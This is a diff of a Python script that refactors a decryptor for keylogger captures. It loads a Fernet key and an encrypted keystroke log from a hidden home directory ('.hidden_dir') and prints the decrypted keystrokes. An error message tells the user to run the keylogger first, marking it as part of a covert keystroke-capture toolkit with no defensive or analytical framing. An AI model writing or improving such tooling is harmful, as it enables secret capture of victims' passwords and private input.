@@ -1,27 +1,36 @@
 import os
 from cryptography.fernet import Fernet
 
-def load_encryption_key():
-    # Get the path to the hidden directory
-    hidden_dir = os.path.join(os.path.expanduser("~"), ".hidden_dir")
-    encryption_key_file = os.path.join(hidden_dir, "encryption_key.txt")
-    
-    # Load the encryption key from the file
-    with open(encryption_key_file, "rb") as key_file:
-        key = key_file.read()
-    return key
-
-# Load the encryption key
-key = load_encryption_key()
-cipher = Fernet(key)
-
-# Read the encrypted log file
 hidden_dir = os.path.join(os.path.expanduser("~"), ".hidden_dir")
-encrypted_file = os.path.join(hidden_dir, "keylog_encrypted.txt")
-with open(encrypted_file, "rb") as f:
-    encrypted_lines = f.readlines()
+key_file = os.path.join(hidden_dir, "encryption_key.txt")
+log_file = os.path.join(hidden_dir, "keylog_encrypted.txt")
 
-# Decrypt and print each entry
-for encrypted_line in encrypted_lines:
-    decrypted_line = cipher.decrypt(encrypted_line).decode()
-    print(decrypted_line.strip())  # Remove trailing newline character
+def load_key():
+    if not os.path.exists(key_file):
+        raise FileNotFoundError("Encryption key not found. Run keylogger first.")
+    with open(key_file, "rb") as f:
+        return f.read()
+
+def load_logs():
+    if not os.path.exists(log_file):
+        raise FileNotFoundError("Log file not found.")
+    with open(log_file, "rb") as f:
+        return f.readlines()
+
+def main():
+    key = load_key()
+    cipher = Fernet(key)
+
+    encrypted_lines = load_logs()
+
+    print("\nDecrypted Keystrokes:\n" + "-" * 40)
+
+    for line in encrypted_lines:
+        try:
+            decrypted = cipher.decrypt(line.strip()).decode()
+            print(decrypted)
+        except Exception:
+            print("[Corrupted Entry Skipped]")
+
+if __name__ == "__main__":
+    main()
